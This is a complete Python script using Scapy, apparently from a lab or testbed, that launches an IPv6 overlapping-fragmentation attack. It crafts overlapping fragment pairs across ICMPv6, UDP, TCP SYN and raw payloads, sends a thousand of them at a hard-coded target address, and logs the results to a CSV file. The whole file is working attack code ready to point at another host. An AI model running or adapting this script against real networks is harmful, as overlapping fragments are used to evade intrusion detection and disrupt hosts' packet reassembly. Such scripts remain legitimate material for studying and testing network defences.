# Overlapping Fragmentation Attack
from scapy.all import IPv6, IPv6ExtHdrFragment, ICMPv6EchoRequest, UDP, TCP, Raw, send
import time, random
import os
import csv

TARGET_IP = "2001:db8::2"
INTERFACE = "eth3"
ATTACK_TYPE = "Overlapping Fragmentation"
PAYLOAD = b"A" * 1024
CSV_FILE = "attack_results.csv"

def simulate_overlapping_fragmentation():
    identification = random.randint(1, 65535)
    fragments = []

    proto_choice = random.choice(["icmp", "udp", "tcp", "raw"])
    if proto_choice == "icmp":
        upper_layer = ICMPv6EchoRequest(data=PAYLOAD[:16])
        overlap_layer = ICMPv6EchoRequest(data=PAYLOAD[8:24])
    elif proto_choice == "udp":
        upper_layer = UDP(sport=1234, dport=5678)/Raw(load=PAYLOAD[:16])
        overlap_layer = UDP(sport=1234, dport=5678)/Raw(load=PAYLOAD[8:24])
    elif proto_choice == "tcp":
        upper_layer = TCP(sport=1234, dport=80, flags="S")/Raw(load=PAYLOAD[:16])
        overlap_layer = TCP(sport=1234, dport=80, flags="S")/Raw(load=PAYLOAD[8:24])
    else:
        upper_layer = Raw(load=PAYLOAD[:16])
        overlap_layer = Raw(load=PAYLOAD[8:24])

    frag1 = IPv6(dst=TARGET_IP)/IPv6ExtHdrFragment(id=identification, offset=0, m=1)/upper_layer
    frag2 = IPv6(dst=TARGET_IP)/IPv6ExtHdrFragment(id=identification, offset=1, m=0)/overlap_layer

    fragments.extend([frag1, frag2])

    start_time = time.time()
    for frag in fragments:
        send(frag, iface=INTERFACE, verbose=0)
    end_time = time.time()

    return len(fragments), len(PAYLOAD), round(end_time - start_time, 4), proto_choice

def log_results(attack_type, frag_count, payload_size, time_taken, protocol, response="N/A", error="N/A"):
    file_exists = os.path.isfile(CSV_FILE)
    try:
        with open(CSV_FILE, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Attack Type", "Protocol", "Fragment Count", "Payload Size", "Reassembly Time (s)", "Target Response", "Errors"])
            writer.writerow([attack_type, protocol, frag_count, payload_size, time_taken, response, error])
    except Exception as write_error:
        print("[-] Failed to write to CSV:", write_error)

if __name__ == '__main__':
    for packets in [1000]:
        print(f"\n[*] Sending {packets} packets...")
        start_time = time.time()
        try:
            for _ in range(packets):
                frag_count, payload_size, time_taken, proto = simulate_overlapping_fragmentation()
                log_results(f"{ATTACK_TYPE} ({packets})", frag_count, payload_size, time_taken, proto)
                time.sleep(0.005) 
        except Exception as e:
            log_results(f"{ATTACK_TYPE} ({packets})", frag_count, payload_size, time_taken, proto)
        end_time = time.time()
        print(f"[+] Done sending {packets} packets. Total time: {round(end_time - start_time, 2)} seconds.")
